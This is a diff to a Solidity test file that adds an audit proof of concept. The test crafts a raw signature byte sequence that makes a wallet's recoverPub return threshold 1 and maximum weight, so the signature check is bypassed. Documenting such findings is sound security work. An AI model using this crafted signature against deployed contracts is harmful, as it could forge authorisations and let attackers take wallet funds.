@@ -1638,10 +1638,35 @@ contract BaseSigTest is AdvTest {
       checkpointerAddress, abi.encodeWithSelector(ICheckpointer.snapshotFor.selector), abi.encode(latestSnapshot)
     );
 
-    (uint256 threshold, uint256 weight, bytes32 imageHash, uint256 checkpoint,) =
-      baseSigImp.recoverPub(payload, maliciousSignature, true, address(0));
+    (uint256 threshold, uint256 weight,,,) = baseSigImp.recoverPub(payload, maliciousSignature, true, address(0));
 
     assertGe(weight, threshold, "Weight must at least reach threshold");
+  }
+
+  //@audit-poc
+  function test_Ignore_Checkpointer_Leaves_CheckpointerData_InStream(
+  ) external {
+    Payload.Decoded memory payload;
+    bytes32 opHash = Payload.hashFor(payload, address(baseSigImp));
+    bytes memory opHashBytes = abi.encodePacked(opHash);
+    
+    address checkpointer = makeAddr("checkpointer");
+    bytes memory signature = abi.encodePacked(
+      bytes1(0x44), //Top level signature -> only checkpointer usage bit is set
+      bytes20(checkpointer), //Checkpointer address
+      bytes1(0x02), //Byte 1, Reading Checkpoint value
+      bytes1(uint8(0x01)), //+ Byte 2 , Read as threshold
+      bytes1(uint8(0x50)), //+ Byte 3 , Read as flag for branch signature (0101 0000 & 1111 0000 ) >> 4 => 101 => 5
+      opHashBytes
+    );
+
+    (uint256 threshold, uint256 weight,, uint256 checkpoint, bytes32 recoveredOpHash) =
+      baseSigImp.recoverPub(payload, signature, true, address(0));
+
+    assertEq(threshold, 1,'Threshold not set as intended');
+    assertEq(weight, type(uint256).max, "Weight not set as intended");
+    assertEq(checkpoint, 2,'Checkpoint not set as intended');
+    assertEq(recoveredOpHash, opHash, "OpHash didn't match");
   }
 
   function computeImageHash(
